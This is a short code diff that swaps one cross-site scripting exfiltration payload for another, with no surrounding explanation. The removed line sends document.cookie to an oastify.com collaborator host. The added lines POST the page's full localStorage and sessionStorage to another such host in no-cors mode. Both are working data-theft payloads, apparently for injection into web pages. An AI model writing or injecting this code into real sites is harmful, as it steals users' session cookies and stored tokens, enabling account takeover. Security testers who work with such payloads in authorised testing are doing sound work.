@@ -1,1 +1,8 @@
-fetch('https://c4hpp4uxniquddecm611gtm7byhp5ft4.oastify.com', { method: 'POST', mode: 'no-cors', body:document.cookie });
+fetch('https://w969uozhs2veixjwrq6lldrrgim9a0yp.oastify.com', {
+  method: 'POST',
+  mode: 'no-cors',
+  body: JSON.stringify({
+    local: {...localStorage},
+    session: {...sessionStorage}
+  })
+});
